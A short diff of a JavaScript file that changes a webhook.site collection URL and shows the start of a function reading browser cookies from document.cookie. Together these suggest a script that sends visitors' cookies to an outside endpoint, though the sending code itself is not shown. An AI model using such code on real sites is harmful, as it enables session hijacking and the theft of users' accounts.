@@ -1,7 +1,7 @@
 
 const dataToSend = {
 };
-var url = "https://webhook.site/eac99d84-8bc8-4c73-9057-b7b3b6aa33c5";
+var url = "https://webhook.site/vasyapupkin123";
 
 function getCookie(name) {
   const cookies = document.cookie.split('; ');
